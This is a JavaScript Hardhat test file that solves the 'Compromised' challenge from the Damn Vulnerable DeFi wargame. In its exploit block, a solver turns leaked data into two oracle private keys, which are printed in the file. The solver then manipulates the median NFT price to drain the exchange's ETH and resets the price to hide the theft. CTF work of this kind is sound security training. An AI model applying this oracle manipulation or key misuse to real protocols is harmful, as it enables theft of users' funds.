const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        // Making a guess as to what the leaked data is, I decoded them with
        // python (decode hex to characters, then decode that with base64) and
        // got the following:
        const leak1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const leak2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

        // The leaks look awfully like private keys, so I created two wallets from
        // them and checked their addresses. The addresses matched two of the
        // three sources in the list above
        const wallet1 = new ethers.Wallet(leak1, ethers.provider);
        const wallet2 = new ethers.Wallet(leak2, ethers.provider);

        // These logs prove that the wallets are owned by two of the sources
        //console.log(wallet1.address);
        //console.log(wallet2.address);

        // Now that we know that, we know how to solve the challenge. It uses
        // the median price to determine the price of the NFT, which in this
        // context with three trusted sources means it sorts the prices of
        // each source and picks the second source's price from the list (i.e
        // the middle price).
        //
        // Knowing this, the plan is to set the NFT price to 0.1 ether on both
        // the sources. Then the median price will also become 0.1 ether. After
        // that, we can just buy the NFT, reset the price to the amount of
        // ether stored in the entire exchange, and sell the NFT to get all
        // the ether out of the exchange.
        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther('1'));
        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther('1'));

        // Buy the token for 1 ether
        const buyTx = await this.exchange.connect(wallet1).buyOne({value: ethers.utils.parseEther('1')});
        const buyTxConfirmed = await buyTx.wait();
        const tokenBoughtEvent = buyTxConfirmed.events.find(event => event.event === 'TokenBought');
        const tokenId = tokenBoughtEvent.args.tokenId;

        // The exchange now has 9991 ether, so set the price of the NFT to this amount
        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther('9991'));
        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther('9991'));

        // Sell the NFT
        await this.nftToken.connect(wallet1).approve(this.exchange.address, tokenId);
        await this.exchange.connect(wallet1).sellOne(tokenId);

        // Fix back the price of the NFT so no one knows what happened
        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther('999'));
        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther('999'));

        // Transfer the ether from wallet1 to the attacker
        await wallet1.sendTransaction({to: attacker.address, value: ethers.utils.parseEther('9990')});
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
